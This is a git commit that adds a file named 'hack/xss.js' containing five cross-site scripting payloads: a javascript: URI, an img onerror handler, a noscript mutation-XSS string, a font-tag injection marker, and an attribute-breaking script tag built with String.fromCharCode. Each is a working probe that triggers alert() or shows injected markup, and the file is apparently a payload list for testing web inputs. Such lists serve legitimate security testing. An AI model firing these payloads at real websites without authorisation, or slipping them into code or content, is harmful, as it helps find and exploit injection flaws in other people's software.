3c27a106424c03c9d7761ddc5eb1a6c1fef4cba3
R1Px0x8 <96251092+R1Px@users.noreply.github.com>
2023-11-16 14:19:00 +0300

    Create xss.js

---
+++ hack/xss.js
@@ -0,0 +1,5 @@
+javascript:alert()
+<img src=x onerror=alert()>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<font color=red size=60>XSS DETECTED</font>
+"><script>alert(String.fromCharCode(88,83,83));</script>
